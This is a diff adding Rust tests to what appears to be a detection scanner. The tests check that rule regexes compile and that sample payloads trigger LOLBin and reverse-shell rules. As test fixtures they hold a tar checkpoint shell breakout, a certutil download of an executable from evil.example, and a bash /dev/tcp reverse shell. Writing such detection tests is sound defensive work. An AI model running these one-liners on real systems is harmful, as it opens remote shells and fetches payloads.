@@ -321,6 +321,80 @@ mod parity_rust {
         );
     }
 
+    // Every embedded rule's pattern must compile under the `regex` crate.
+    // The engine silently skips patterns that fail to compile (Err(_) =>
+    // continue), so an invalid pattern is a *silent* detection gap — this
+    // test makes that failure loud. Critical for generated packs (LOLBin /
+    // reverse-shell) whose regexes come from `re.escape` in Python.
+    #[test]
+    fn all_embedded_rule_patterns_compile() {
+        use regex::Regex;
+        let mut bad = Vec::new();
+        for pack in load_all_packs() {
+            for rule in &pack.rules {
+                if let Err(e) = Regex::new(&rule.pattern) {
+                    bad.push(format!("{} ({}): {e}", rule.id, pack.meta.id));
+                }
+            }
+        }
+        assert!(
+            bad.is_empty(),
+            "uncompilable rule patterns:\n{}",
+            bad.join("\n")
+        );
+    }
+
+    // Generated LOLBin / reverse-shell packs: confirm representative payloads
+    // are detected and that the bare binary name alone is NOT flagged.
+    #[test]
+    fn gtfobins_tar_checkpoint_breakout_detected() {
+        let contents = "tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh";
+        let packs = packs_for_phase("code_patterns");
+        let findings = scan_file_with_packs(&packs, "build.sh", "build.sh", contents);
+        assert!(
+            has_rule(&findings, "GTFO-TAR"),
+            "expected GTFO-TAR; got {:?}",
+            findings.iter().map(|f| &f.rule).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn gtfobins_bare_tar_not_flagged() {
+        // A benign tar invocation must not trip the LOLBin rule.
+        let contents = "tar -czf dist.tgz ./build";
+        let packs = packs_for_phase("code_patterns");
+        let findings = scan_file_with_packs(&packs, "release.sh", "release.sh", contents);
+        assert!(
+            !has_rule(&findings, "GTFO-TAR"),
+            "benign tar wrongly flagged: {:?}",
+            findings.iter().map(|f| &f.rule).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn lolbas_certutil_download_detected() {
+        let contents = "certutil.exe -urlcache -f http://evil.example/x.exe C:\\x.exe";
+        let packs = packs_for_phase("code_patterns");
+        let findings = scan_file_with_packs(&packs, "drop.bat", "drop.bat", contents);
+        assert!(
+            has_rule(&findings, "LOLBAS-CERTUTIL"),
+            "expected LOLBAS-CERTUTIL; got {:?}",
+            findings.iter().map(|f| &f.rule).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn revshells_bash_devtcp_detected() {
+        let contents = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
+        let packs = packs_for_phase("network_exfil");
+        let findings = scan_file_with_packs(&packs, "x.sh", "x.sh", contents);
+        assert!(
+            findings.iter().any(|f| f.rule.starts_with("RSHELL-")),
+            "expected a RSHELL-* match; got {:?}",
+            findings.iter().map(|f| &f.rule).collect::<Vec<_>>()
+        );
+    }
+
     // Phase 1 — install hooks
 
     #[test]
